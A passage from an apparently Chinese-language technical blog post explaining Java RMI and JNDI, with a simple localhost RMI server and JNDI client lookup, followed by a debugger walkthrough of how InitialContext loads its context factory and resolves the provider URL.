<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">RemoteInterface</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">Object</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>远程对象：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">
<span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>stoocea</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RemoteObject</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">RemoteInterface</span>  <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span>  <span class="token class-name">RemoteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">Object</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>服务端逻辑：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>stoocea</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMI_Server</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">RemoteObject</span> remoteObject<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RemoteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/Hello"</span><span class="token punctuation">,</span>remoteObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"server端正在运行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 启动 RMI 服务，然后我们用 JNDI 的接口去调远程对象</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">
<span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>stoocea</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDI</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span> env<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">"rmi://localhost:1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Context</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RemoteInterface</span> remoteObject<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">RemoteInterface</span><span class="token punctuation">)</span> initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteObject<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>调用结果如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709881726884-296c72f9-c169-4fb6-9bf7-9f1305ae0647.png#averageHue=%233f434c&clientId=u3dcabff8-befb-4&from=paste&height=86&id=ue3bc9478&originHeight=129&originWidth=772&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=34813&status=done&style=none&taskId=u4d1b64e6-9f5f-432b-bd42-4905f157296&title=&width=514.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>稍微分析一下 JNDI 实现端的逻辑：<br>我们通过 设置环境变量，指定了要从哪获取对象，也就是 1099 端口上的 registry 注册中心，然后就调用创建出来的 Context 的 lookup 即可<br>那么 JNDI 是如何识别我们指定的服务，以及如何定位到服务中心的？</p>
<h1 id="JNDI-工作流程"><a href="#JNDI-工作流程" class="headerlink" title="JNDI 工作流程"></a>JNDI 工作流程</h1><h2 id="0x01-context-初始化和对应属性设置"><a href="#0x01-context-初始化和对应属性设置" class="headerlink" title="0x01 context 初始化和对应属性设置"></a>0x01 context 初始化和对应属性设置</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709958482095-1b3cbfad-8fb1-40b5-8cf2-25565f77066f.png#averageHue=%233c414a&clientId=u1db2a60e-ea5c-4&from=paste&height=285&id=S1R4D&originHeight=428&originWidth=1040&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=217100&status=done&style=none&taskId=ue0a53bb7-7ab3-4ab9-ac34-a8845a585d4&title=&width=693.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>我们之前提到过 JNDI 的整体架构，最近的一层是 JNDI 的 spi 层，他是我们能够接触到的 JNDI 最直接的，然后我们看 InitalContext 的导包结构，他导入了 naming 下的 spi 服务，而 SPI 本身的作用主要是为底层的具体目录服务提供统一的接口，从而能够使得目录服务的可插拔安装，这正好对应 InitialContext 为什么要获取 <code>INITIAL_CONTEXT_FACTORY</code>与<code>PROVIDER_URL</code>，正是为了满足这一条件</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span> env<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">"rmi://localhost:1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Context</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><code>INITIAL_CONTEXT_FACTORY</code>能够让 initalContext 能够正常获取到我们想要指定的服务名称</li>
<li><code>PROVIDER_URL</code>能够让初始化出来的 context 定位到服务位置</li>
</ul>
<p>这其实跟之前 RMI 获取到服务中心的流程很像，而 RMI 其实是隶属于 JNDI 的，所以操作步骤也是差不多的<br>除了这么一个通过 hashtable 传值初始化 initcontext 的方法，还有其他两种方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709960790782-f8b6eb11-8aa4-408e-a245-4840911c3e82.png#averageHue=%233b3f48&clientId=u1db2a60e-ea5c-4&from=paste&height=103&id=ufb536bf0&originHeight=155&originWidth=553&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=42849&status=done&style=none&taskId=uc319a1a8-3960-4412-bdd7-fa82213109c&title=&width=368.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>第一个是选择不初始化 initcontext<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709960852314-59e9baee-1377-43e7-9681-cdd8bcd16140.png#averageHue=%233e444f&clientId=u1db2a60e-ea5c-4&from=paste&height=91&id=u35582505&originHeight=136&originWidth=892&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=54271&status=done&style=none&taskId=u9a80c55f-c893-45ee-82ee-0699050856f&title=&width=594.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>直接调用 init 方法，从环境变量中获取属性值<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709960874141-34d29a29-30f7-4f78-8b81-2a28da85d7c0.png#averageHue=%233d434d&clientId=u1db2a60e-ea5c-4&from=paste&height=327&id=uc6d20593&originHeight=490&originWidth=1171&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=254651&status=done&style=none&taskId=u5ef480c5-b930-4954-9fb0-b9c6d036209&title=&width=780.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>实现如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//设置JNDI环境变量</span>

<span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span><span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span><span class="token string">"rmi://localhost:1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//初始化上下文</span>

<span class="token class-name">InitialContext</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>JNDI 的功能点其实和 RMI 差不多</p>
<h2 id="0x02-JNDI-底层实现"><a href="#0x02-JNDI-底层实现" class="headerlink" title="0x02 JNDI 底层实现"></a>0x02 JNDI 底层实现</h2><h3 id="1x01-获取-contect-的-factor-构造类"><a href="#1x01-获取-contect-的-factor-构造类" class="headerlink" title="1x01 获取 contect 的 factor 构造类"></a>1x01 获取 contect 的 factor 构造类</h3><p>我们把断点打在<code>initcontext</code>初始化的地方<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709962859359-b3d0792c-80f0-4824-9db3-b9e0b03e5c7b.png#averageHue=%233e444d&clientId=u1db2a60e-ea5c-4&from=paste&height=231&id=uef32c070&originHeight=346&originWidth=1809&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=297125&status=done&style=none&taskId=u9bf5dbad-2637-4d31-b152-67864075202&title=&width=1206" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709963021470-6782f214-c516-4622-8ad3-9bf522701e79.png#averageHue=%233d434c&clientId=u1db2a60e-ea5c-4&from=paste&height=231&id=ue19f3aab&originHeight=347&originWidth=1019&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=143299&status=done&style=none&taskId=ub9161b29-c6f2-4f52-b54d-2ce178cfa96&title=&width=679.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>然后继续跟进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709963003765-9e30d29f-a28a-4606-8ac2-ce98fcf24024.png#averageHue=%233d434d&clientId=u1db2a60e-ea5c-4&from=paste&height=332&id=ue092f1e6&originHeight=498&originWidth=1222&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=248715&status=done&style=none&taskId=u4af5563d-1678-4d70-9683-b1cf812908f&title=&width=814.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>在 init 方法中，首先是获取环境变量，也就是当前系统，以及我们刚才设置的 hashtable 的环境变量<br>然后跟进 getDefaultInitCtx()方法，最终跟进到 NamingManager 的 <code>getInitialContext</code>方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709963127706-537baf2b-d819-48da-aa30-d8a36b6953ce.png#averageHue=%23444a55&clientId=u1db2a60e-ea5c-4&from=paste&height=457&id=u2e44740f&originHeight=685&originWidth=1381&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=417841&status=done&style=none&taskId=u8dd2c531-0c7e-4bf0-89d0-938e9ac8dfe&title=&width=920.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>首先<code>getInitialContextFactoryBuilder();</code>获取到 Context 的工厂 builder 类，如果 builder 为空，就直接获取<code>INITIAL_CONTEXT_FACTORY</code>属性，作为我们的 Context 工厂 builer 类，那这里就是我们刚才通过 hashtable 设置的<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>了<br>然后继续往下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709963494884-d01fe898-5e1c-4007-8e17-bde81fbd4441.png#averageHue=%23434a55&clientId=u1db2a60e-ea5c-4&from=paste&height=405&id=ufe9049a4&originHeight=608&originWidth=1214&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=289622&status=done&style=none&taskId=uf82fb388-9213-4632-898b-b9e91d29b9d&title=&width=809.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>通过 loadClass 动态加载工厂类，最后调用 RegistryContextFactory的getInitialContext方法<br>整理一下调用类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">InitialContext</span>#<span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">getDefaultInitCtx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">NamingManager</span><span class="token punctuation">.</span><span class="token function">getInitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token class-name">VersionHelper</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span>这个helper是<span class="token class-name">NamingManager</span>中的一个属性值，专门用来动态实例化类<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964014420-cec5e139-283d-4569-bee8-4a21b2d0ad57.png#averageHue=%23555555&clientId=u1db2a60e-ea5c-4&from=paste&height=84&id=u638989ea&originHeight=126&originWidth=880&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=11083&status=done&style=none&taskId=udbf996e7-ca81-4a20-aeeb-ac3c7589894&title=&width=586.6666666666666" referrerpolicy="no-referrer" alt="未命名文件.png"><br>事后继续翻阅流程的时候也在最终返回的 getInitialContext 方法中，发现实现了这个方法的类就那么几个，也就是 JNDI 服务种类的那些<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964466086-fd5af5f0-8471-46fd-9776-f040c843ef97.png#averageHue=%2352666c&clientId=u1db2a60e-ea5c-4&from=paste&height=166&id=u9b392616&originHeight=249&originWidth=1188&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=111952&status=done&style=none&taskId=u1de5d9fc-fa3e-4bb0-b3d5-986892b57be&title=&width=792" referrerpolicy="no-referrer" alt="image.png"></p>
<h3 id="1x02-获取-context-内容"><a href="#1x02-获取-context-内容" class="headerlink" title="1x02 获取 context 内容"></a>1x02 获取 context 内容</h3><p>继续跟进 factrory 的 getInitialContext 的方法，这里的 var1 就是我们自己传的那个 hashtable 变量<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964200592-4b3056d9-bc20-4bf0-b930-c285b2fc05f2.png#averageHue=%23424853&clientId=u1db2a60e-ea5c-4&from=paste&height=527&id=u1a05f4b6&originHeight=790&originWidth=1857&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=580106&status=done&style=none&taskId=u5c8f57e5-5f21-40e6-b89f-70989394da1&title=&width=1238" referrerpolicy="no-referrer" alt="image.png"><br>var1 作为 getInitCtxURL 的参数值跟进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964335769-5e04ef94-399e-46d2-a419-efbe64d375a5.png#averageHue=%23424853&clientId=u1db2a60e-ea5c-4&from=paste&height=540&id=ufe00a006&originHeight=810&originWidth=1423&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=497125&status=done&style=none&taskId=u329bdd2f-599f-41df-a4f8-bd932409f37&title=&width=948.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>分析逻辑，这里是类 RegistryContextFactory，所以如果 var2 为空，他默认是返回 rmi 协议头，但是没有 URL 解析，这里我们 var2 肯定不为空，所以就直接返回 var2<br>继续跟进外层的 URLToContext<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709971563591-feaf0944-60e8-4b94-8b67-01e162d64b92.png#averageHue=%234b505e&clientId=u1db2a60e-ea5c-4&from=paste&height=257&id=u56a07f33&originHeight=385&originWidth=1755&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=287991&status=done&style=none&taskId=u7784f39e-fca1-4a88-b48c-b86566f7706&title=&width=1170" referrerpolicy="no-referrer" alt="image.png"><br>开始调用 rmiURLContextFactory 的 getObjectInstance 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709971859094-5dab14d4-30b5-4b60-9369-29b28a16cea5.png#averageHue=%23474e59&clientId=u1db2a60e-ea5c-4&from=paste&height=298&id=udede1636&originHeight=447&originWidth=1963&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=354789&status=done&style=none&taskId=u83023e36-779e-4b75-b843-d0216c92ad8&title=&width=1308.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这里会判断我们的 RMIURL 是否为空之后，跟进 <code>getUsingURL</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709973476747-caa5cb1f-6cd1-42bb-ac1b-86c0c34b0749.png#averageHue=%233d444e&clientId=u1db2a60e-ea5c-4&from=paste&height=264&id=u259c4202&originHeight=396&originWidth=1634&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=252501&status=done&style=none&taskId=u6c71e4e0-2e2a-4159-b77e-aac4aa678c7&title=&width=1089.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>很奇怪，这里会直接调用 rmiURLContext 的 lookup 方法，但是此时 RMI 等相关配置还未装配，继续跟进看看逻辑<br>由于 rmiURLContext 本身是不带 lookup 方法，所以直接到父类<code>GenericURLContext</code>的 lookup 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709973543311-de3f7f84-bc9c-43bd-8e7e-c3e0d8402eef.png#averageHue=%233d434c&clientId=u1db2a60e-ea5c-4&from=paste&height=342&id=u1706948c&originHeight=513&originWidth=1243&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=264857&status=done&style=none&taskId=u6c801d7f-26ca-4d9d-be5e-ad51b4ac17d&title=&width=828.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>这里第一部逻辑就是执行 getRootURLContext()方法获取解析结果，这里的结果 var 如下，结果封装成了 ResolveResult 对象，通过 getResolvedObj 方法取出 RegistryContext<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709973680235-ff5a722a-0c4f-4cb5-b8d4-45d89dfb139f.png#averageHue=%23363d44&clientId=u1db2a60e-ea5c-4&from=paste&height=178&id=u4e74f29e&originHeight=267&originWidth=1547&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=241764&status=done&style=none&taskId=u37acdd0b-6d6b-41d0-a084-19df6c38fc8&title=&width=1031.3333333333333" referrerpolicy="no-referrer" 